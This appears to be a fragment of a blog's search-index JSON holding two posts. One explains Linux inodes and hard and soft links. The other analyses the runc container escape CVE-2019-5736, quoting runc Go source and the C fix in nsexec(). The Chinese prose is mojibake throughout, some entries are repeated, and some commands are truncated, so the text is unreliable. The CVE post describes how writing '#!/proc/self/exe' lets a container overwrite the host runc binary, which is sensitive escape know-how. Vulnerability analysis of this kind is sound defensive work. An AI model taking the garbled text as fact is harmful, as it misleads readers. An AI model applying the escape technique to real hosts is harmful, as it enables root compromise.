æ³•æ¸…æ™°æµ®ç°å‡ºæ¥ï¼Œä¸ä¹‹ç›¸å…³çš„inodeã€ç¡¬é“¾æ¥ã€è½¯è¿æ¥(å³ç¬¦å·é“¾æ¥)è¿™äº›Linuxç³»ç»Ÿçš„æ¦‚å¿µä¹Ÿè®°ä¸æ¸…äº†ã€‚äºæ˜¯ç‰¹æ„é‡æ–°ç¿»çœ‹äº†ä¸€ä¸‹æ“ä½œç³»ç»Ÿçš„ä¹¦ç±ï¼ŒæŸ¥é˜…äº†ä¸€äº›èµ„æ–™ï¼Œè®°å½•ä¸€ä¸‹ã€‚ ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:1:0","series":null,"tags":["review"],"title":"LinuxçŸ¥è¯†å›é¡¾ï¼šinodeä¸è½¯é“¾æ¥ã€ç¡¬é“¾æ¥","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#å‰è¨€"},{"categories":["Linux"],"content":"UNIX(Linux)æ–‡ä»¶ç³»ç»Ÿ inodeä¸data block æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ–‡ä»¶æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç£ç›˜è¢«åˆ’åˆ†åˆ†åŒºå¹¶æ ¼å¼åŒ–çš„æ—¶å€™ï¼Œæ•´ä¸ªåˆ†åŒºä¼šè¢«åˆ’åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯inodeåŒºå’Œdata blockåŒºã€‚å…¶ä¸­inodeåŒºå­˜æ”¾çš„æ˜¯æ–‡ä»¶çš„inodeä¿¡æ¯ï¼Œdata blockåŒºå­˜æ”¾çš„æ˜¯çœŸæ­£çš„æ–‡ä»¶æ•°æ®å†…å®¹ã€‚ inodeæ˜¯ä¸€ç§UNIXç³»ç»Ÿä¸­ç”¨äºå­˜å‚¨æ–‡ä»¶ç›¸å…³ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼ŒåŒ…æ‹¬inodeå·ã€æ–‡ä»¶çš„uidã€gidã€å„ä¸ªç»„çš„rwxæƒé™ç­‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œinodeå¹¶ä¸å«æœ‰æ–‡ä»¶åã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç†è§£ï¼ŒUNIXç³»ç»Ÿä¸­çš„æ–‡ä»¶åæ˜¯ç»™ç”¨æˆ·ä½¿ç”¨çš„ï¼Œå®é™…ä¸Šç³»ç»Ÿæ‰“å¼€æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯é€šè¿‡inodeå·å»å¯»æ‰¾å¯¹åº”çš„inodeï¼Œç„¶åè¿›è¡Œåˆ¤æ–­å½“å‰ç”¨æˆ·çš„æƒé™ç­‰æ“ä½œï¼Œå†æ‰“å¼€è¯¥æ–‡ä»¶ã€‚ åœ¨ä½¿ç”¨lså‘½ä»¤æ—¶å¯ä»¥åŠ ä¸Š-ié€‰é¡¹æŸ¥çœ‹æ–‡ä»¶å¯¹åº”çš„inodeå·ã€‚ image-20210601205746981image-20210601205746981 \" image-20210601205746981 ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥ è¿™æ˜¯ä¸€å¯¹å®¹æ˜“è®°æ··çš„æ¦‚å¿µã€‚é¦–å…ˆæ¥è¯´ç¡¬é“¾æ¥(hard link)ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªæ–‡ä»¶åä¼šå¯¹åº”ä¸€ä¸ªinodeå·ç ï¼Œä½†æ˜¯Linuxç³»ç»Ÿå…è®¸å¤šä¸ªæ–‡ä»¶åå¯¹åº”åŒä¸€ä¸ªinodeå·ç ï¼Œå³æŒ‡å‘åŒä¸€ä¸ªinodeå¯¹è±¡ï¼Œè¿™äº›å…¶ä»–çš„æ–‡ä»¶åå°±å«åšç¡¬é“¾æ¥ã€‚inodeä¸­çš„é“¾æ¥æ•°å­—æ®µä¿¡æ¯ä¿å­˜äº†è¯¥æ–‡ä»¶çš„é“¾æ¥æ•°é‡ï¼Œæ¯ä¸ªæ–°åˆ›å»ºçš„ç¡¬é“¾æ¥éƒ½ä¼šä½¿å…¶åŠ 1ã€‚ åˆ›å»ºç¡¬é“¾æ¥å¯ä»¥ä½¿ç”¨lnå‘½ä»¤æ¥å®Œæˆ $ ln \u003cfile-path\u003e \u003clink-name\u003e è½¯é“¾æ¥åˆå«ç¬¦å·é“¾æ¥(symbolic link)ï¼ŒåŸç†ä¸ç¡¬é“¾æ¥å®Œå…¨ä¸åŒã€‚è½¯é“¾æ¥å¯ä»¥çœ‹ä½œæ˜¯windowsç³»ç»Ÿçš„å¿«æ·æ–¹å¼ï¼Œæ¯ä¸ªè½¯é“¾æ¥éƒ½æ˜¯ç‹¬ç«‹çš„æ–‡ä»¶ï¼Œåªä¸è¿‡æ–‡ä»¶ä¸­çš„å†…å®¹æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ã€‚ä¸ç¡¬é“¾æ¥ä¸åŒçš„æ˜¯ï¼Œè½¯é“¾æ¥å¯ä»¥ç”¨äºç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥å¯¹ä¸€ä¸ªç›®å½•åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œè€Œç¡¬é“¾æ¥æ˜¯åªèƒ½ä½œç”¨ä¸æ–‡ä»¶çš„ã€‚ ä½¿ç”¨lnå‘½ä»¤ä¹Ÿå¯ä»¥åˆ›å»ºè½¯é“¾æ¥ $ ln -s \u003cfile-path\u003e \u003clink-name\u003e ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:2:0","series":null,"tags":["review"],"title":"LinuxçŸ¥è¯†å›é¡¾ï¼šinodeä¸è½¯é“¾æ¥ã€ç¡¬é“¾æ¥","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#unixlinuxæ–‡ä»¶ç³»ç»Ÿ"},{"categories":["Linux"],"content":"UNIX(Linux)æ–‡ä»¶ç³»ç»Ÿ inodeä¸data block æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ–‡ä»¶æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç£ç›˜è¢«åˆ’åˆ†åˆ†åŒºå¹¶æ ¼å¼åŒ–çš„æ—¶å€™ï¼Œæ•´ä¸ªåˆ†åŒºä¼šè¢«åˆ’åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯inodeåŒºå’Œdata blockåŒºã€‚å…¶ä¸­inodeåŒºå­˜æ”¾çš„æ˜¯æ–‡ä»¶çš„inodeä¿¡æ¯ï¼Œdata blockåŒºå­˜æ”¾çš„æ˜¯çœŸæ­£çš„æ–‡ä»¶æ•°æ®å†…å®¹ã€‚ inodeæ˜¯ä¸€ç§UNIXç³»ç»Ÿä¸­ç”¨äºå­˜å‚¨æ–‡ä»¶ç›¸å…³ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼ŒåŒ…æ‹¬inodeå·ã€æ–‡ä»¶çš„uidã€gidã€å„ä¸ªç»„çš„rwxæƒé™ç­‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œinodeå¹¶ä¸å«æœ‰æ–‡ä»¶åã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç†è§£ï¼ŒUNIXç³»ç»Ÿä¸­çš„æ–‡ä»¶åæ˜¯ç»™ç”¨æˆ·ä½¿ç”¨çš„ï¼Œå®é™…ä¸Šç³»ç»Ÿæ‰“å¼€æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯é€šè¿‡inodeå·å»å¯»æ‰¾å¯¹åº”çš„inodeï¼Œç„¶åè¿›è¡Œåˆ¤æ–­å½“å‰ç”¨æˆ·çš„æƒé™ç­‰æ“ä½œï¼Œå†æ‰“å¼€è¯¥æ–‡ä»¶ã€‚ åœ¨ä½¿ç”¨lså‘½ä»¤æ—¶å¯ä»¥åŠ ä¸Š-ié€‰é¡¹æŸ¥çœ‹æ–‡ä»¶å¯¹åº”çš„inodeå·ã€‚ image-20210601205746981image-20210601205746981 \" image-20210601205746981 ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥ è¿™æ˜¯ä¸€å¯¹å®¹æ˜“è®°æ··çš„æ¦‚å¿µã€‚é¦–å…ˆæ¥è¯´ç¡¬é“¾æ¥(hard link)ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªæ–‡ä»¶åä¼šå¯¹åº”ä¸€ä¸ªinodeå·ç ï¼Œä½†æ˜¯Linuxç³»ç»Ÿå…è®¸å¤šä¸ªæ–‡ä»¶åå¯¹åº”åŒä¸€ä¸ªinodeå·ç ï¼Œå³æŒ‡å‘åŒä¸€ä¸ªinodeå¯¹è±¡ï¼Œè¿™äº›å…¶ä»–çš„æ–‡ä»¶åå°±å«åšç¡¬é“¾æ¥ã€‚inodeä¸­çš„é“¾æ¥æ•°å­—æ®µä¿¡æ¯ä¿å­˜äº†è¯¥æ–‡ä»¶çš„é“¾æ¥æ•°é‡ï¼Œæ¯ä¸ªæ–°åˆ›å»ºçš„ç¡¬é“¾æ¥éƒ½ä¼šä½¿å…¶åŠ 1ã€‚ åˆ›å»ºç¡¬é“¾æ¥å¯ä»¥ä½¿ç”¨lnå‘½ä»¤æ¥å®Œæˆ $ ln è½¯é“¾æ¥åˆå«ç¬¦å·é“¾æ¥(symbolic link)ï¼ŒåŸç†ä¸ç¡¬é“¾æ¥å®Œå…¨ä¸åŒã€‚è½¯é“¾æ¥å¯ä»¥çœ‹ä½œæ˜¯windowsç³»ç»Ÿçš„å¿«æ·æ–¹å¼ï¼Œæ¯ä¸ªè½¯é“¾æ¥éƒ½æ˜¯ç‹¬ç«‹çš„æ–‡ä»¶ï¼Œåªä¸è¿‡æ–‡ä»¶ä¸­çš„å†…å®¹æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ã€‚ä¸ç¡¬é“¾æ¥ä¸åŒçš„æ˜¯ï¼Œè½¯é“¾æ¥å¯ä»¥ç”¨äºç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥å¯¹ä¸€ä¸ªç›®å½•åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œè€Œç¡¬é“¾æ¥æ˜¯åªèƒ½ä½œç”¨ä¸æ–‡ä»¶çš„ã€‚ ä½¿ç”¨lnå‘½ä»¤ä¹Ÿå¯ä»¥åˆ›å»ºè½¯é“¾æ¥ $ ln -s ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:2:0","series":null,"tags":["review"],"title":"LinuxçŸ¥è¯†å›é¡¾ï¼šinodeä¸è½¯é“¾æ¥ã€ç¡¬é“¾æ¥","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#inodeä¸data-block"},{"categories":["Linux"],"content":"UNIX(Linux)æ–‡ä»¶ç³»ç»Ÿ inodeä¸data block æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæ–‡ä»¶æ˜¯å­˜å‚¨åœ¨ç£ç›˜ä¸Šçš„ã€‚åœ¨Linuxç³»ç»Ÿä¸­ï¼Œç£ç›˜è¢«åˆ’åˆ†åˆ†åŒºå¹¶æ ¼å¼åŒ–çš„æ—¶å€™ï¼Œæ•´ä¸ªåˆ†åŒºä¼šè¢«åˆ’åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯inodeåŒºå’Œdata blockåŒºã€‚å…¶ä¸­inodeåŒºå­˜æ”¾çš„æ˜¯æ–‡ä»¶çš„inodeä¿¡æ¯ï¼Œdata blockåŒºå­˜æ”¾çš„æ˜¯çœŸæ­£çš„æ–‡ä»¶æ•°æ®å†…å®¹ã€‚ inodeæ˜¯ä¸€ç§UNIXç³»ç»Ÿä¸­ç”¨äºå­˜å‚¨æ–‡ä»¶ç›¸å…³ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼ŒåŒ…æ‹¬inodeå·ã€æ–‡ä»¶çš„uidã€gidã€å„ä¸ªç»„çš„rwxæƒé™ç­‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œinodeå¹¶ä¸å«æœ‰æ–‡ä»¶åã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç†è§£ï¼ŒUNIXç³»ç»Ÿä¸­çš„æ–‡ä»¶åæ˜¯ç»™ç”¨æˆ·ä½¿ç”¨çš„ï¼Œå®é™…ä¸Šç³»ç»Ÿæ‰“å¼€æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯é€šè¿‡inodeå·å»å¯»æ‰¾å¯¹åº”çš„inodeï¼Œç„¶åè¿›è¡Œåˆ¤æ–­å½“å‰ç”¨æˆ·çš„æƒé™ç­‰æ“ä½œï¼Œå†æ‰“å¼€è¯¥æ–‡ä»¶ã€‚ åœ¨ä½¿ç”¨lså‘½ä»¤æ—¶å¯ä»¥åŠ ä¸Š-ié€‰é¡¹æŸ¥çœ‹æ–‡ä»¶å¯¹åº”çš„inodeå·ã€‚ image-20210601205746981image-20210601205746981 \" image-20210601205746981 ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥ è¿™æ˜¯ä¸€å¯¹å®¹æ˜“è®°æ··çš„æ¦‚å¿µã€‚é¦–å…ˆæ¥è¯´ç¡¬é“¾æ¥(hard link)ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªæ–‡ä»¶åä¼šå¯¹åº”ä¸€ä¸ªinodeå·ç ï¼Œä½†æ˜¯Linuxç³»ç»Ÿå…è®¸å¤šä¸ªæ–‡ä»¶åå¯¹åº”åŒä¸€ä¸ªinodeå·ç ï¼Œå³æŒ‡å‘åŒä¸€ä¸ªinodeå¯¹è±¡ï¼Œè¿™äº›å…¶ä»–çš„æ–‡ä»¶åå°±å«åšç¡¬é“¾æ¥ã€‚inodeä¸­çš„é“¾æ¥æ•°å­—æ®µä¿¡æ¯ä¿å­˜äº†è¯¥æ–‡ä»¶çš„é“¾æ¥æ•°é‡ï¼Œæ¯ä¸ªæ–°åˆ›å»ºçš„ç¡¬é“¾æ¥éƒ½ä¼šä½¿å…¶åŠ 1ã€‚ åˆ›å»ºç¡¬é“¾æ¥å¯ä»¥ä½¿ç”¨lnå‘½ä»¤æ¥å®Œæˆ $ ln è½¯é“¾æ¥åˆå«ç¬¦å·é“¾æ¥(symbolic link)ï¼ŒåŸç†ä¸ç¡¬é“¾æ¥å®Œå…¨ä¸åŒã€‚è½¯é“¾æ¥å¯ä»¥çœ‹ä½œæ˜¯windowsç³»ç»Ÿçš„å¿«æ·æ–¹å¼ï¼Œæ¯ä¸ªè½¯é“¾æ¥éƒ½æ˜¯ç‹¬ç«‹çš„æ–‡ä»¶ï¼Œåªä¸è¿‡æ–‡ä»¶ä¸­çš„å†…å®¹æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ã€‚ä¸ç¡¬é“¾æ¥ä¸åŒçš„æ˜¯ï¼Œè½¯é“¾æ¥å¯ä»¥ç”¨äºç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥å¯¹ä¸€ä¸ªç›®å½•åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œè€Œç¡¬é“¾æ¥æ˜¯åªèƒ½ä½œç”¨ä¸æ–‡ä»¶çš„ã€‚ ä½¿ç”¨lnå‘½ä»¤ä¹Ÿå¯ä»¥åˆ›å»ºè½¯é“¾æ¥ $ ln -s ","date":"2021-05-31","objectID":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/:2:0","series":null,"tags":["review"],"title":"LinuxçŸ¥è¯†å›é¡¾ï¼šinodeä¸è½¯é“¾æ¥ã€ç¡¬é“¾æ¥","uri":"/2021-05-31-linux%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BEinode%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%E7%A1%AC%E9%93%BE%E6%8E%A5/#ç¡¬é“¾æ¥ä¸è½¯é“¾æ¥"},{"categories":["æºç é˜…è¯»"],"content":"æ¼æ´èƒŒæ™¯ runcæ˜¯ä¸€ä¸ªæ ¹æ®OCI(Open Container Initiative)æ ‡å‡†åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œdockerå¼•æ“ä¹Ÿæ˜¯åŸºäºruncæ„å»ºçš„ã€‚2019å¹´2æœˆ11æ—¥ï¼Œruncçš„ç›¸å…³ç ”ç©¶äººå‘˜é€šè¿‡oss-securityé‚®ä»¶å‘å¸ƒäº†runcé€ƒé€¸æ¼æ´çš„è¯¦æƒ…ã€‚ æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨å®¹å™¨å†…é€šè¿‡ç‰¹å®šæ“ä½œè¦†ç›–å®¿ä¸»æœºä¸Šçš„runcäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»è€Œåœ¨å®¿ä¸»æœºä¸Šä»¥rootæƒé™æ‰§è¡Œä»£ç ï¼Œè¾¾åˆ°å®¹å™¨é€ƒé€¸çš„ç›®çš„ã€‚ å½±å“ç‰ˆæœ¬ï¼šrunc \u003c= 1.0-rc6 ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:1:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#æ¼æ´èƒŒæ™¯"},{"categories":["æºç é˜…è¯»"],"content":"æ¼æ´æˆå›  dockeré€šè¿‡runcå¯åŠ¨å®¹å™¨çš„æµç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ æ­¥ï¼š docker-cliæ ¹æ®ç”¨æˆ·å‘½ä»¤å‘å‡ºè¯·æ±‚ç»™docker-daemonï¼Œdocker-daemonç»è¿‡docker-daemon -\u003e contained -\u003e containerd-shim -\u003e runcçš„è°ƒç”¨é“¾å¯åŠ¨runc runcæ‰§è¡Œrunc runå‘½ä»¤ï¼Œåˆ›å»ºå®¹å™¨å¤–çš„runcè¿›ç¨‹ å®¹å™¨å¤–çš„runcè¿›ç¨‹å¤„ç†ç”Ÿæˆåˆ›å»ºå®¹å™¨æ‰€éœ€ä¿¡æ¯ï¼Œå†æ‰§è¡Œrunc initå‘½ä»¤åˆ›å»ºå­è¿›ç¨‹ runc initå­è¿›ç¨‹å¯¹namespaceç­‰è¿›è¡Œå¤„ç†ï¼Œå°†è‡ªèº«è¿›ç¨‹è½¬å˜æˆä¸ºå®¹å™¨è¿›ç¨‹ï¼Œå¹¶æœ€ç»ˆå°†è‡ªèº«çš„è¿›ç¨‹æ˜ åƒæ›¿æ¢ä¸ºç”¨æˆ·æŒ‡å®šçš„å†…å®¹ rc6ç‰ˆæœ¬åŠä¹‹å‰çš„runcåˆ›å»ºçš„runc initè¿›ç¨‹ä½¿ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶å°±æ˜¯å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åœ¨å®¹å™¨å†…ä¿®æ”¹å®¹å™¨å†…å¾…æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹ï¼Œå†™å…¥#!/proc/self/exeï¼Œè·å–å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶æè¿°ç¬¦ï¼Œä»è€Œè¿›è¡Œä¿®æ”¹ã€‚ æ­£å¸¸çš„åˆ›å»ºå®¹å™¨å¹¶åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤çš„è¿‡ç¨‹ç¤ºæ„å›¾å¦‚ä¸‹å›¾æ‰€ç¤º upload_757c2cc51fb90da6bd6126b193581a20.png\" upload_757c2cc51fb90da6bd6126b193581a20.png è€Œä¿®æ”¹äº†å¾…æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹ä¹‹åï¼Œrunc initè¿›ç¨‹ä¼šæ‰§è¡Œè‡ªèº«ï¼Œä»è€Œå°†å®¿ä¸»æœºä¸Šçš„runcæ–‡ä»¶æš´éœ²ç»™äº†å®¹å™¨å†…éƒ¨ upload_c5457e4e1d840ef2efb4fa18764992cf.png\" upload_c5457e4e1d840ef2efb4fa18764992cf.png ","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:2:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#æ¼æ´æˆå› "},{"categories":["æºç é˜…è¯»"],"content":"å…·ä½“ä»£ç åˆ†æ é¦–å…ˆrunc runä¼šæ‰§è¡Œrunå‘½ä»¤å¯¹åº”çš„actionï¼Œä»è€Œæ‰§è¡ŒstartContainerå‡½æ•° func startContainer(context *cli.Context, spec *specs.Spec, action CtAct, criuOpts *libcontainer.CriuOpts) (int, error) { id := context.Args().First() if id == \"\" { return -1, errEmptyID } notifySocket := newNotifySocket(context, os.Getenv(\"NOTIFY_SOCKET\"), id) if notifySocket != nil { if err := notifySocket.setupSpec(context, spec); err != nil { return -1, err } } container, err := createContainer(context, id, spec) if err != nil { return -1, err } if notifySocket != nil { if err := notifySocket.setupSocketDirectory(); err != nil { return -1, err } if action == CT_ACT_RUN { if err := notifySocket.bindSocket(); err != nil { return -1, err } } } // Support on-demand socket activation by passing file descriptors into the container init process. listenFDs := []*os.File{} if os.Getenv(\"LISTEN_FDS\") != \"\" { listenFDs = activation.Files(false) } logLevel := \"info\" if context.GlobalBool(\"debug\") { logLevel = \"debug\" } r := \u0026runner{ enableSubreaper: !context.Bool(\"no-subreaper\"), shouldDestroy: true, container: container, listenFDs: listenFDs, notifySocket: notifySocket, consoleSocket: context.String(\"console-socket\"), detach: context.Bool(\"detach\"), pidFile: context.String(\"pid-file\"), preserveFDs: context.Int(\"preserve-fds\"), action: action, criuOpts: criuOpts, init: true, logLevel: logLevel, } return r.run(spec.Process) } å‡½æ•°æœ€åçš„r.run()å‡½æ•°åˆ›å»ºæ–°è¿›ç¨‹å¹¶è°ƒç”¨linuxContainerç»“æ„å®ç°çš„Run()æ–¹æ³•ã€‚ func (c *linuxContainer) Run(process *Process) error { if err := c.Start(process); err != nil { return err } if process.Init { return c.exec() } return nil } å‡½æ•°è°ƒç”¨Start()å‡½æ•°ï¼ŒStart()æ˜¯å¯¹start()å‡½æ•°çš„å°è£…ã€‚è¯¥å‡½æ•°ä¼šè°ƒç”¨newParentProcess()å‡½æ•°ç”ŸæˆinitProcessç±»å‹çš„å¯¹è±¡ï¼Œå†è°ƒç”¨initProcessç»“æ„å®ç°çš„start()æ–¹æ³• func (c *linuxContainer) start(process *Process) (retErr error) { parent, err := c.newParentProcess(process) if err != nil { return newSystemErrorWithCause(err, \"creating new parent process\") } ... if err := parent.start(); err != nil { return newSystemErrorWithCause(err, \"starting container process\") } ... return nil } initProcessç»“æ„å®ç°çš„start()æ–¹æ³•ä¼šæ‰§è¡Œrunc initå‘½ä»¤ï¼Œå¹¶ç­‰å¾…runc initå­è¿›ç¨‹å®Œæˆå®¹å™¨åˆ›å»ºä»¥åŠè¿›ç¨‹æ˜ åƒæ›¿æ¢ä¹‹åé€€å‡º func (p *initProcess) start() (retErr error) { defer p.messageSockPair.parent.Close() err := p.cmd.Start() p.process.ops = p ... ierr := parseSync(p.messageSockPair.parent, func(sync *syncT) error { switch sync.Type { case procReady: // set rlimits, this has to be done here because we lose permissions ... sentRun = true case procHooks: // Setup cgroup before prestart hook, so that the prestart hook could apply cgroup permissions. ... sentResume = true default: return newSystemError(errors.New(\"invalid JSON payload from child\")) } return nil }) return nil } éšç€runc initå‘½ä»¤è¢«æ‰§è¡Œï¼ŒåŒç†ï¼Œinitå‘½ä»¤å¯¹åº”çš„actionä¹Ÿä¼šè¢«æ‰§è¡Œï¼Œå¹¶ä¸”æ­¤æ—¶çš„runc initè¿›ç¨‹ä¼šæœ€ç»ˆå˜æˆå¯åŠ¨çš„å®¹å™¨è¿›ç¨‹ã€‚ var initCommand = cli.Command{ Name: \"init\", Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`, Action: func(context *cli.Context) error { factory, _ := libcontainer.New(\"\") if err := factory.StartInitialization(); err != nil { // as the error is sent back to the parent there is no need to log // or write it to stderr because the parent process will handle this os.Exit(1) } panic(\"libcontainer: container init failed to exec\") }, } StartInitialization()å‡½æ•°è°ƒç”¨linuxStandardInitç±»å‹çš„ä¿¡æ¯å¯¹è±¡ï¼Œå¹¶è°ƒç”¨Init()å‡½æ•°åˆ›å»ºåˆå§‹åŒ–è¿›ç¨‹ // StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state // This is a low level implementation detail of the reexec and should not be consumed externally func (l *LinuxFactory) StartInitialization() (err error) { ... envInitType := os.Getenv(\"_LIBCONTAINER_INITTYPE\") it := initType(envInitType) ... i, err := newContainerInit(it, pipe, consoleSocket, fifofd, logPipeFd) if err != nil { return err } // If Init succeeds, syscall.Exec will not return, hence none of the defers will be called. return i.Init() Init()å‡½æ•°å®Œæˆç½‘ç»œã€è·¯ç”±ã€namespaceã€rootfsç­‰è®¾ç½®ï¼Œå¹¶æœ€ç»ˆæ›¿æ¢è¿›ç¨‹æ˜ åƒä¸ºç”¨æˆ·æŒ‡å®šçš„å†…å®¹ã€‚ func (l *linuxStandardInit) Init() error { runtime.LockOSThread() defer runtime.UnlockOSTh","date":"2021-04-27","objectID":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/:2:1","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)æ¼æ´åˆ†æ-ç¬¬äºŒç‰ˆ","uri":"/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/#å…·ä½“ä»£ç åˆ†æ"},{"categories":["æºç é˜…è¯»"],"content":"æ¼æ´ä¿®å¤ runcå›¢é˜Ÿåœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­è¿›è¡Œäº†ä¿®å¤ã€‚æ ¹æ®goçš„CGOæœºåˆ¶ï¼Œinit.goæ–‡ä»¶ä¸­å¼•å…¥äº†nsenteråŒ…ï¼Œè€Œnsenter.goä¸­çš„CGOå†…å®¹æŒ‡å®šäº†nsexec.cä¸­å®šä¹‰çš„nsexec()å‡½æ•°ä¼šåœ¨åŒ…å¼•å…¥å‰è¢«æ‰§è¡Œã€‚ å›¢é˜Ÿåœ¨nsexec()å‡½æ•°ä¸­å¢åŠ äº†å¯¹å®¿ä¸»æœºçš„runcæ–‡ä»¶è¿›è¡Œè‡ªæˆ‘å¤åˆ¶çš„æ“ä½œã€‚ void nsexec(void) { int pipenum; jmp_buf env; int sync_child_pipe[2], sync_grandchild_pipe[2]; struct nlconfig_t config = { 0 }; /* * Setup a pipe to send logs to the parent. This should happen * first, because bail will use that pipe. */ setup_logpipe(); /* * If we don't have an init pipe, just return to the go routine. * We'll only get an init pipe for start or exec. */ pipenum = initpipe(); if (pipenum == -1) return; /* * We need to re-exec if we are not in a cloned binary. This is necessary * to ensure that containers won't be able to access the host binary * through /proc/self/exe. See CVE-2019-5736. */ if (ensure_cloned_binary() \u003c 0) bail(\"could not ensure we are a cloned binary\"); ... } 